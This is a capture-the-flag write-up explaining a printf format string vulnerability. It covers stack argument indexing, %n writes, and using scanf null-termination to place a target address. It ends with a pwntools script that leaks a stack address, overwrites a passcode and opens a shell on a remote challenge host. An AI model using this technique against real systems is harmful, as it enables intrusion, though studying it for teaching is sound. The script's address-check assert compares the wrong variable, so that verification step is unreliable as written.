# Printf

As the name suggests, this is a straightforward format string vulnerability:

``` C
    scanf("%99s", buf);
    // [...]
    printf(buf);
    printf("\n");
```

An easy way to confirm our hypothesis (for instance if we did not have access to
either the binary or the source code) would be to pass a format string like `%p`
as input and look for some hex-formatted pointer (or `(nil)`) in the output.


Half the job is already done for us, as our only task is to overwrite a single
integer in order to be offered a shell:

``` C
  if (passcode == 40) {
    get_shell();
  }
```


The main ingredients of our exploit are the following:
1. The `%n` format directive. This is what makes format string attacks possible:
`printf("foo%n", &some_integer)` writes the number of bytes written so far by
`printf` (here `3`) to the `some_integer` variable. If we control the pointer
(`&some_integer`), we have arbitrary write capacity.
2. The `-` format modifier to `%s`. This allows us to control the number of
bytes output by `printf`, and therefore the value we will write using `%n`:
`printf("%-40s")` outputs exactly `40` characters regardless of the value of the
corresponding parameter (with the caveat that the parameter must still be a
valid pointer, otherwise it would segfault).
3. On `x86`, the function arguments are passed on the stack. Upon calling
`printf`, the first argument is located at `$ebp+8` (memory at `$ebp` contains
the calling function's saved `$ebp` and memory at `$ebp+4` cotains the calling
function's saved `$eip`), and subsequent arguments are located at `$ebp+12`,
`$ebp+16`, etc. Since `printf`s format string is parsed at runtime, each format
directive is simply translated as accessing an offset from `$ebp`, and printing
the formatted value at that address, no bounds checking being performed.
Therefore, by controlling the format string, we can access any memory location
at address `$ebp + 8 + 4*k` for `k >= 0`. This means in particular that we can
access values in the calling function's stack frame, including the calling
function's calling function's saved `$ebp`, which means we ca always find an
index `k` such that the memory value at `$ebp + 8 + 4*k` is an address at a
constant offset of `$ebp`. This will come in handy when we want to leak the
address of our target to bypass ASLR.
On `amd64` (System V ABI), things work roughly the same way, except that the
pointers are `8` bytes instead of `4`, and the first `6` parameters are passed
through registers (`$rdi, $rsi, $rdx, $rcx, $r8, $r9`), so the `7`th format
directive corresponds to the value at address `$rbp+16` (and the first `6`
correspond to the values in the above registers).
4. Explicit parameter indexes in format directives. This allows us to access
arbitrary parameters (or any value on the stack past the first parameter's
address, really) wihout clogging our payload: `printf("%2$p", 0xbad, 0xbeef)`
prints `0xbeef`. More generally, we can access the value at address
`$rbp + 16 + k * 8` directly, e.g. `%10$p` for `$rbp + 16 + 32` (keeping in mind
that the first index corresponding to a stack parameter is `7`, so our indexes
are shifted by 6).
5. The fact that `scanf("%s", buf)` null-terminates the input string. While
`scanf` treats null bytes as string delimiters, we cannot input null bytes to
our buffer. However, we can have `scanf` write one null byte for us at an
arbitrary offset by supplying an input of length that offset minus one.
Practically, input `AAA` will write a null byte in `buf[3]`.


From there, the protocole is simple:
1. figure out the argument index for `buf` from within printf (using
format `AAAAAAAABBBBBBBB%1$p %2$p [...]`),
2. leak an address on the stack at a constant offset from the `passcode`
variable,
3. craft a payload that writes our target address at an aligned address so that
we can access it through `%10$n`. Since this is a 64bit binary, the stack
addresses will start with some null bytes, which `scanf()` will interpret as
string delimiters. Luckily, `scanf("%s")` will also null-terminate the input,
and since the binary is running on a little-endian platform, we can do this in
two steps: 1. null the last byte (`AAAAAAA`), 2. write the six least significant
bytes and have the null-termination zero-out the 7th.

Finally, with our target address available at parameter index `10`, we can
simply use a combination of `%-40s` (which will output 40 bytes no matter what)
and `%10$n`, which will write the number of bytes written by printf to the
address we carefuly selected.


Python exploit:

``` python
from pwn import *

p = remote('printf-34c9a9bc71372d47.elb.us-west-1.amazonaws.com', 666)

PROMPT = b"Enter a string (or 'quit')\n"
p.recvuntil(PROMPT)
p.sendline("%25$p")
addr = int(p.readline(), 16)
log.info(f"Leaked stack addr: {hex(addr)}")

# The offset is computed by inspecting the value of `$25$p` locally with
# that of `$rbp-0x74` in gdb.
password_addr = addr - 0x15c
log.info(f"Computed target addr: {hex(password_addr)}")

# Zero-out the last byte of the third 8-byte block.
p.recvuntil(PROMPT)
p.sendline(b"A" * 23)

p.recvuntil(PROMPT)
p.sendline(b"A" * 16 + p64(password_addr))

# Let's make sure we wrote the correct address:
p.recvuntil(PROMPT)
p.sendline(b"%10$p")
loaded_addr = int(p.readline(), 16)
assert addr == loaded_addr

# Set counter to 40 and write to loaded addr.
p.recvuntil(PROMPT)
p.sendline(b"%-40s%10$n")

# Exit loop and pop that sweet shell.
p.recvuntil(PROMPT)
p.sendline("quit")

p.interactive()
```
